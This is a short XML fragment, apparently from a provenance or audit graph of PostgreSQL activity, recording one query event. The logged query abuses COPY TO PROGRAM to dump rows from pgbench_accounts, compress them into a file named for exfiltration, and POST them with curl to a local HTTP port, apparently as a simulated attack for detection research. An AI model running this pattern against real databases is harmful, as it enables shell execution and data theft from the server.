    <node id="('Query', 2608)">
      <data key="d3">Query</data>
      <data key="d4">115567</data>
      <data key="d5">1788642121</data>
      <data key="d6">115567</data>
      <data key="d7">1788642122.0</data>
      <data key="d8">ExecutorStart</data>
      <data key="d9">COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'gzip &gt; /tmp/exfil_gzip_curl.dat &amp;&amp; curl -s -X POST -d @/tmp/exfil_gzip_curl.dat http://127.0.0.1:9090 2&gt;/dev/null || true';</data>
